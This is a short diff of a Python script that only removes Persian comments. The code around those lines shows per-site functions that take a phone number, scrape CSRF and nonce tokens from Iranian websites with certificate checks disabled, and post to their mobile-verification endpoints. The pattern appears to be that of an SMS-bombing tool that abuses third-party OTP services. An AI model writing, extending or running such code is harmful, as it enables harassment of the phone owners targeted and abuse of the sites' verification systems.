@@ -211,7 +211,6 @@ def mohrpegah(phone):
         response = session.get(home_url, headers=headers, timeout=10, verify=False)
         soup = BeautifulSoup(response.text, "html.parser")
 
-‎        # پیدا کردن توکن‌ها
         dig_nounce = None
         for inp in soup.find_all("input"):
             if inp.get("name") == "dig_nounce":
@@ -226,7 +225,6 @@ def mohrpegah(phone):
         print(f"[+] CSRF: {csrf}")
         print(f"[+] Dig Nounce: {dig_nounce}")
 
-‎        # آماده کردن POST
         url = "https://mohrpegah.com/wp-admin/admin-ajax.php"
         data = {
             "action": "digits_check_mob",
@@ -271,7 +269,6 @@ def mohrpegah(phone):
 
 def toorangco(phone):
     try:
-‎        # تبدیل شماره به فرمت 09...
         phone_number = phone.replace("+98", "0").replace("98", "0")
         url = f"https://eapi.toorangco.com/api/CheckUserMobile/{phone_number}/1"
 
